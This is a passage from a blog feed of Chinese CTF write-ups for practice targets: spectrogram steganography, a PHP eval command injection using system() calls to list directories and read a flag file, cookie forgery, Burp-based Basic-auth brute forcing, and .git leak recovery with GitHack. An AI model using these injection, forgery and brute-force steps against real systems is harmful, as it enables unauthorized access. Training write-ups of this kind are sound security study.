<p>只需要用手点点就能发现意想不到的东西，岂不美哉≖‿≖✧ </p>
</blockquote>
<p>音频是一段杂音或者比较刺耳，波形图也没有规律，则可能是频谱图隐写</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E9%A2%91%E8%B0%B1%E5%9B%BE/image-20240920012648185.png"
                      alt="image-20240920012648185"
                ></p>
<p>波形图不连续也没有规律，用频谱图看看</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E9%A2%91%E8%B0%B1%E5%9B%BE/image-20240920012732399.png"
                      alt="image-20240920012732399"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E9%A2%91%E8%B0%B1%E5%9B%BE/image-20240920012745555.png"
                      alt="image-20240920012745555"
                ></p>
<p>直接就得到flag了</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对于频谱图，可以作为一个日常判断来做题，拿到音频题就直接看一下频谱图，不是就不管，是的话不就成了嘛，当然还是先试听一下，一般来说不会给这么明显简单的题目 </p>
<p><a class="link"   href="https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%83%E7%AB%A0][7.3.4%20%E9%A2%91%E8%B0%B1%E5%9B%BE]hear_with_your_eyes" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>misc</category>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>隐写术</tag>
      </tags>
  </entry>
  <entry>
    <title>RCE-eval执行</title>
    <url>/2024/09/14/ctf/writeup/web/ctfhub/RCE-eval%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<h1 id="RCE-eval执行"><a href="#RCE-eval执行" class="headerlink" title="RCE-eval执行"></a>RCE-eval执行</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://www.ctfhub.com/" >CTFHUB <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，比较官方的一个大型练习靶场</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场之前，题目的名字是<code>eval执行</code>，直接冲着eval执行漏洞去挖</p>
<p>打开靶场，直接漏出源码，审计一下发现需要我们传入参数<code>cmd</code>，然后它会直接执行我们传入的参数</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/RCE-eval%E6%89%A7%E8%A1%8C/image-20240914224547586.png"
                      alt="image-20240914224547586"
                ></p>
<p>直接传入system函数进行cmd命令输出</p>
<p>查看目录文件</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">system(<span class="string">&quot;ls /&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>记得要在命令末尾加上;</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/RCE-eval%E6%89%A7%E8%A1%8C/image-20240914224936330.png"
                      alt="image-20240914224936330"
                ></p>
<p>发现目录下面有<code>flag_27537</code>这样的文件，打开看看</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">system(<span class="string">&quot;cat /flag_27537&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/RCE-eval%E6%89%A7%E8%A1%8C/image-20240914225035612.png"
                      alt="image-20240914225035612"
                ></p>
<p>好家伙flag直接出来了</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>所以看到eval执行的恐怖了吧，直接对服务器进行命令行操作，自己有项目时一定要慎用，要用也要做好防范措施</p>
<p><a class="link"   href="https://www.ctfhub.com/#/skilltree" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>路径为web-&gt;RCE-&gt;eval执行</p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>web</category>
        <category>ctfhub</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>rce</tag>
      </tags>
  </entry>
  <entry>
    <title>web前置技能-HTTP协议</title>
    <url>/2024/09/15/ctf/writeup/web/ctfhub/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<h1 id="web前置技能-HTTP协议"><a href="#web前置技能-HTTP协议" class="headerlink" title="web前置技能-HTTP协议"></a>web前置技能-HTTP协议</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://www.ctfhub.com/" >CTFHUB <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，比较官方的一个大型练习靶场</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><div class="tabs" id="tab-web前置技能-http协议"><ul class="nav-tabs"><li class="tab active"><a class="#web前置技能-http协议-1">题目-请求方式</a></li><li class="tab"><a class="#web前置技能-http协议-2">题目-302跳转</a></li><li class="tab"><a class="#web前置技能-http协议-3">题目-Cookie</a></li><li class="tab"><a class="#web前置技能-http协议-4">题目-基础认证</a></li><li class="tab"><a class="#web前置技能-http协议-5">题目-响应包源代码</a></li></ul><div class="tab-content"><div class="tab-pane active" id="web前置技能-http协议-1"><h3 id="题目-请求方式"><a href="#题目-请求方式" class="headerlink" title="题目-请求方式"></a>题目-请求方式</h3>  <div class="note p-4 mb-4 rounded-small info">
    <p>HTTP 请求方法, HTTP&#x2F;1.1协议中共定义了八种方法（也叫动作）来以不同方式操作指定的资源</p>

  </div>

<p>打开靶场，根据题目需要入手的是HTTP的请求方式</p>
<p>看到网页上显示HTTP的提交方式是<code>CTFHUB</code>就会给我们flag，然后下面一行提示表示需要用<code>index.php</code>请求</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240915202012505.png"
                      alt="image-20240915202012505"
                ></p>
<p>因为原页面就是<code>index.php</code>请求，所以直接抓包即可</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240915202702082.png"
                      alt="image-20240915202702082"
                ></p>
<p>然后<code>GET</code>改为<code>CTFHUB</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240915203925037.png"
                      alt="image-20240915203925037"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240915203939085.png"
                      alt="image-20240915203939085"
                ></p>
<p>这样flag就直接出来了，确实是前置技能哈哈哈(ฅ´ω&#96;ฅ) </p></div><div class="tab-pane" id="web前置技能-http协议-2"><h3 id="题目-302跳转"><a href="#题目-302跳转" class="headerlink" title="题目-302跳转"></a>题目-302跳转</h3>  <div class="note p-4 mb-4 rounded-small info">
    <p>HTTP临时重定向</p>

  </div>

<p>题目中提示需要用到302临时重定向跳转</p>
<blockquote>
<p>在HTTP协议中，302 Found是一种临时重定向状态码，它表示请求的资源已经被临时移动到了由Location头部给出的URL。这个URL可能是新的位置，也可能是请求的资源的另一个版本。这个状态码的主要目的是将用户的请求重定向到新的URL，以便他们能够获得完整的资源。</p>
</blockquote>
<p>打开靶场，点击<code>Give me Flag</code>会发现一直只跳转到本网页，就说明确实需要配合重定向来结解题</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240915204346059.png"
                      alt="image-20240915204346059"
                ></p>
<p>先用F12（ctrl+U）大法看看网页源码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240915205115281.png"
                      alt="image-20240915205115281"
                ></p>
<p>看到链接应该是<code>Index.php</code>，但每次点击都只会跳转到<code>index.html</code>，只需要临时抓包不放包就可以防止网页302</p>
<p>点击链接，我们用BP抓包，再发送给repeater（可以理解为发送包后又临时抓包但不返回到浏览器页面的功能）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240915205435134.png"
                      alt="image-20240915205435134"
                ></p>
<p>可以看到send后是一个302的请求，所以才会被重定向</p>
<p>通过查询，还有另一种方式就是cmd命令里的curl命令</p>
<p>在cmd中</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">curl -v http://challenge-62083e00fdc21e52.sandbox.ctfhub.com:10800/index.php</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>注意是原本的网页.php</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240915205703202.png"
                      alt="image-20240915205703202"
                ></p>
<p>然后就会返回原本的文件头，而不会被浏览器解析</p>
<p><a class="link"   href="https://blog.csdn.net/u013514928/article/details/102810250" >curl命令用法 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></div><div class="tab-pane" id="web前置技能-http协议-3"><h3 id="题目-Cookie"><a href="#题目-Cookie" class="headerlink" title="题目-Cookie"></a>题目-Cookie</h3>  <div class="note p-4 mb-4 rounded-small info">
    <p>Cookie欺骗、认证、伪造</p>

  </div>

<p>打开靶场看到提示只有<code>admin</code>能够拿到flag，再根据题目是cookie的伪造，所以这道题从cookie下手</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916005118438.png"
                      alt="image-20240916005118438"
                ></p>
<p>用BP抓包看看</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916005704097.png"
                      alt="image-20240916005704097"
                ></p>
<p>很明显的看到cookie里面的admin为0，那把它改为1不就成了吗，恭喜，这道题你做出来了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916005755371.png"
                      alt="image-20240916005755371"
                ></p></div><div class="tab-pane" id="web前置技能-http协议-4"><h3 id="题目-基础认证"><a href="#题目-基础认证" class="headerlink" title="题目-基础认证"></a>题目-基础认证</h3>  <div class="note p-4 mb-4 rounded-small info">
    <p>在HTTP中，基本认证（英语：Basic access authentication）是允许http用户代理（如：网页浏览器）在请求时，提供 用户名 和 密码 的一种方式。详情请查看 <a class="link"   href="https://zh.wikipedia.org/wiki/HTTP%E5%9F%BA%E6%9C%AC%E8%AE%A4%E8%AF%81" >https://zh.wikipedia.org/wiki/HTTP基本认证 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>

  </div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916005910601.png"
                      alt="image-20240916005910601"
                ></p>
<p>这道题给了我们一个附件，打开附件是一串字符，加上题目可以合理推测是用基础爆破来解题</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916010010509.png"
                      alt="image-20240916010010509"
                ></p>
<p>打开靶场看到有链接，直接点开会，会弹出一个验证框叫我们输入账号密码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916010021706.png"
                      alt="image-20240916010021706"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916010747334.png"
                      alt="image-20240916010747334"
                ></p>
<p>直接抓包看看</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916010522890.png"
                      alt="image-20240916010522890"
                ></p>
<p>然后返回包的头部有提到admin用户，所以后续猜测使用admin用户进行爆破</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916020529442.png"
                      alt="image-20240916020529442"
                ></p>
<p>里面有个<code>Authorization</code>，合理推断其值就是账号密码的加密形式，加密段的后面有<code>==</code>说明是<code>base64加密</code>，直接在线解密试试</p>
<blockquote>
<p>这里了解一下base64的加密规则，不够4个字节的用等号&#x3D;补充</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916010723083.png"
                      alt="image-20240916010723083"
                ></p>
<p>和我输入的账号密码一样，那么我们就可以开始爆破了</p>
<blockquote>
<p>后面是关于BP软件的使用，如果没有用过的可以当提前预知，之后可以慢慢学，先做了解</p>
</blockquote>
<ul>
<li>先把数据包发送到<code>intruder</code></li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916011224974.png"
                      alt="image-20240916011224974"
                ></p>
<ul>
<li>先clear工具默认的爆破点位</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916011343770.png"
                      alt="image-20240916011343770"
                ></p>
<ul>
<li>再选中字段添加爆破点</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916011438064.png"
                      alt="image-20240916011438064"
                ></p>
<ul>
<li><p>选择sniper攻击方式，因为我们只有一个攻击点，只有密码字典，合理猜测账号是<code>admin</code></p>
<div class="note-large red">
  <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
    <p>BP攻击方式</p>

  </div>
  <div class="notel-content">
    <p>Sniper 狙击手 – 只有一个攻击点</p></li>
</ul>
<p>Battering ram 攻城锤 – 两个攻击点，但传入的爆破参数相同</p>
<p>Pitchfork 草叉 – 两个攻击点，传入两个爆破参数</p>
<p>Cluster bomb 榴霰弹 – 具备前三种攻击方式，两个攻击点，爆破参数相互乘积即第二字典被反复使用或同一字典被反复使用（适合集中爆破–不清楚哪个该是密码还是账户）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916012324649.png"
                      alt="image-20240916012324649"
                ></p>

<pre><code>&lt;/div&gt;
</code></pre>
  </div>
  
<p>  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916011533984.png"
                      alt="image-20240916011533984"
                ></p>
<ul>
<li>进入payloads页面传入字典</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916012520071.png"
                      alt="image-20240916012520071"
                ></p>
<ul>
<li><p>将密码的格式粘贴在这里</p>
<details class="red" data-header-exclude><summary><i class="fa-solid fa-chevron-right"></i>对于这个密码格式如何得到有多种方法 </summary>
            <div class='content'>
            <ol><li><p>用BP自带的功能，在<code>Payload Processing</code>的<code>Add</code>中的<code>Add Prefix</code>输入<code>admin:</code>，由于需要的是Base64加密，所以需要在下面对payload进行加密</p><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916021756299.png"
                      alt="image-20240916021756299"
                ></p><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916013852023.png"
                      alt="image-20240916013852023"
                ></p></li><li><p>用脚本直接一步到位，再复制到<code>paylaod settings</code></p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;passwd.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    lines = file.readlines()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;base64.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">            line=base64.b64encode(line.encode()).decode()</span><br><span class="line">            f.write(<span class="string">f&#x27;<span class="subst">&#123;line&#125;</span>\n&#x27;</span>)</span><br></pre></td></tr></table></figure></div></li></ol>
            </div>
          </details>
</li>
<li><p>然后就可以开始爆破了</p>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916013923711.png"
                      alt="image-20240916013923711"
                ></p>
<ul>
<li>发现一个都跑不出来</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916014245240.png"
                      alt="image-20240916014245240"
                ></p>
<blockquote>
<p>网上有说是加密结果不能带有&#x3D;&#x3D;，其实并不是，只是因为在BP里面的&#x3D;会被转义而已，不要被误导了，不然你解一辈子都解不出来</p>
<p>建议去看<a class="link"   href="https://writeup.ctfhub.com/Skill/Web/Web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD/HTTP%E5%8D%8F%E8%AE%AE/3mSzAzbGydVT74nsq1gcVj.html" >官方的writeup <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，我是测试了半天最后去看官方的，真的服了网上的某些帖子了&#x3D;_&#x3D;</p>
</blockquote>
<ul>
<li>需要关闭下面的<code>URL-encode</code>，不然你会看到 base64 之后的 <code>=</code> 会被转成 <code>%3d</code> ，你就算爆破到天荒地老也不会出来</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/10imageslim.png"
                      alt="img"
                ></p>
<ul>
<li>再次<code>Start Attack</code>后，按 <code>Status</code> 排序，看到状态码出现<code>200</code>，即爆破成功</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916020821868.png"
                      alt="image-20240916020821868"
                ></p>
<ul>
<li>可以看到下面正常返回了flag</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916020835063.png"
                      alt="image-20240916020835063"
                ></p></div><div class="tab-pane" id="web前置技能-http协议-5"><h3 id="题目-响应包源代码"><a href="#题目-响应包源代码" class="headerlink" title="题目-响应包源代码"></a>题目-响应包源代码</h3>  <div class="note p-4 mb-4 rounded-small info">
    <p>HTTP响应包源代码查看</p>

  </div>

<p>打开靶场，根据题目要求我们查看源代码，靶场打开也是空白的，那就F12（ctrl+U）大法吧</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916022546590.png"
                      alt="image-20240916022546590"
                ></p>
<p>然后就在源码里面很直白的告诉了你flag (๑•́ ₃•̀๑)  </p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916022716123.png"
                      alt="image-20240916022716123"
                ></p></div></div></div>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这一篇主要就是关于HTTP协议的几个点，从请求方式到网页响应码，再到cookie与加密认证，最后到网页源码，这些都是之后有可能遇到的小知识点，除了BP的使用可能比较困难，其他的确实算是入门级别的，继续加油吧，后面还有更有挑战性的题等着</p>

  <div class="note p-4 mb-4 rounded-small red">
    <p>不要放弃！！！有时候一道题做一天都有可能的！！！</p>

  </div>

<p><a class="link"   href="https://www.ctfhub.com/#/skilltree" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>路径为web-&gt;web前置技能-&gt;HTTP协议</p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>web</category>
        <category>ctfhub</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>信息泄露</tag>
      </tags>
  </entry>
  <entry>
    <title>信息泄露-Git泄露</title>
    <url>/2024/09/12/ctf/writeup/web/ctfhub/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-Git%E6%B3%84%E9%9C%B2/</url>
    <content><![CDATA[<h1 id="信息泄露-Git泄露"><a href="#信息泄露-Git泄露" class="headerlink" title="信息泄露-Git泄露"></a>信息泄露-Git泄露</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://www.ctfhub.com/" >CTFHUB <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，比较官方的一个大型练习靶场</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><div class="tabs" id="tab-信息泄露-git泄露"><ul class="nav-tabs"><li class="tab active"><a class="#信息泄露-git泄露-1">题目-Log</a></li><li class="tab"><a class="#信息泄露-git泄露-2">题目-Stash</a></li><li class="tab"><a class="#信息泄露-git泄露-3">题目-Index</a></li></ul><div class="tab-content"><div class="tab-pane active" id="信息泄露-git泄露-1"><h3 id="题目-Log"><a href="#题目-Log" class="headerlink" title="题目-Log"></a>题目-Log</h3>  <div class="note p-4 mb-4 rounded-small info">
    <p>当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。请尝试使用BugScanTeam的GitHack完成本题。</p>

  </div>

<p>根据题目提示，提前准备工具需要用到<a class="link"   href="https://github.com/BugScanTeam/GitHack" >GitHack <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>打开靶场，页面上很空白，根据题目进行.git文件泄露的恢复操作</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-Git%E6%B3%84%E9%9C%B2-Log/image-20240912213108044.png"
                      alt="image-20240912213108044"
                ></p>
<p>尝试在网址后面添加&#x2F;.git&#x2F;，查看是否网页403或者其他特殊情况，方便我们直接用工具恢复，显然这道题没那么简单</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-Git%E6%B3%84%E9%9C%B2-Log/image-20240912213235037.png"
                      alt="image-20240912213235037"
                ></p>
<p>接下来用网站目录扫描工具，这里用的<a class="link"   href="https://github.com/maurosoria/dirsearch" >dirsearch <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>（可以用御剑等等）</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u 目标地址</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-Git%E6%B3%84%E9%9C%B2-Log/image-20240912213718118.png"
                      alt="image-20240912213718118"
                ></p>
<p>不用扫描完，扫描到确实有.git的存在，我们就可以试试用工具恢复</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-Git%E6%B3%84%E9%9C%B2-Log/image-20240912213911928.png"
                      alt="image-20240912213911928"
                ></p>
<p>在工具包目录下面生成了一些文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-Git%E6%B3%84%E9%9C%B2-Log/image-20240912213948091.png"
                      alt="image-20240912213948091"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-Git%E6%B3%84%E9%9C%B2-Log/image-20240912214334276.png"
                      alt="image-20240912214334276"
                ></p>
<p>但是并没有什么有价值的文件，也没有.git文件</p>
<blockquote>
<p>这是一个坑，要用另一个GitHack.py，并且在python2的环境才可以，建议在kali下运行</p>
<p><a class="link"   href="https://github.com/lijiejie/GitHack" >https://github.com/lijiejie/GitHack <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 用于python3，但恢复效果一般</p>
<p><a class="link"   href="https://github.com/BugScanTeam/GitHack" >https://github.com/BugScanTeam/GitHack <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 用于python2，效果不错</p>
</blockquote>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">python2 GitHack.py 目标地址/.git</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-Git%E6%B3%84%E9%9C%B2/image-20240912215937518.png"
                      alt="image-20240912215937518"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-Git%E6%B3%84%E9%9C%B2-Log/image-20240912220043425.png"
                      alt="image-20240912220043425"
                ></p>
<p>既然有.git，根据题目来看，可以通过查看日志获得一些信息，kali环境自带git，其他没有git环境的需要自己下载</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">log</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-Git%E6%B3%84%E9%9C%B2-Log/image-20240912220103402.png"
                      alt="image-20240912220103402"
                ></p>
<p>通过观察上面的日志信息，可以发生在第二次修改时<code>add flag</code>，说明我们所要的flag就在第二次修改时加入文件中，使用<code>git reset</code>版本回退命令来查看flag</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git reset --hard 对应版本的commit</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-Git%E6%B3%84%E9%9C%B2-Log/image-20240912220806774.png"
                      alt="image-20240912220806774"
                ></p>
<p>最终我们通过.git文件泄露，回退版本得到了flag</p></div><div class="tab-pane" id="信息泄露-git泄露-2"><h3 id="题目-Stash"><a href="#题目-Stash" class="headerlink" title="题目-Stash"></a>题目-Stash</h3>  <div class="note p-4 mb-4 rounded-small info">
